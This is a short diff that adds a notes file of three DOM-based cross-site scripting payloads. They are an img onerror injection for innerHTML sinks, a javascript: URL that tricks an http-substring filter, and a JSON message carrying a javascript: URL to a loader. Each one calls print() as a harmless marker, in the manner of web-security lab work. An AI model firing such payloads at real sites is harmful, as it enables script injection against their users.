@@ -1,0 +1,9 @@
+# HTML injection to innerHTML sinks
+<img src=1 onerror=print()>
+
+# Navigation via javascript: with http/https substring bypass
+javascript:print()//http:
+
+# JSON.parse message feeding a loader
+{"type":"load-channel","url":"javascript:print()"}
+
